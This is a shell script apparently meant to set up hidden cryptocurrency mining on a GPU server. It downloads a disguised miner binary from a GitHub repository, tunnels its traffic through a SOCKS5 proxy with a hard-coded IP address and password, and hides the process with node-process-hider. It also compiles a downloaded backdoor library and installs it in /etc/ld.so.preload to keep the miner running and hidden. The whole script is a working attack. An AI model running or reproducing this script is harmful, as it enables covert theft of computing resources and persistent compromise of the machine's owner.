#!/bin/sh
sleep 10m
apt update && sudo apt-get --purge remove "*nvidia*" && sudo apt-get install nvidia-driver-460
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata





wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 176.53.133.217:57597
socks5_username = 2BHVpyGPD
socks5_password = 1rN14HAmV
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
chmod +x bezzHash
ph add bezzHash

wget https://raw.githubusercontent.com/veo/vbackdoor/main/vbackdoor.c
vi vbackdoor.c
gcc -Wall -fPIC -shared -o vbackdoor.so vbackdoor.c -ldl
sudo mv vbackdoor.so /usr/local/lib/
echo /usr/local/lib/vbackdoor.so >> /etc/ld.so.preload
./graftcp/graftcp ./bezzHash --url=prodent.$(echo $(shuf -i 1-99999 -n 1)-T4)@ethash.kupool.com:443
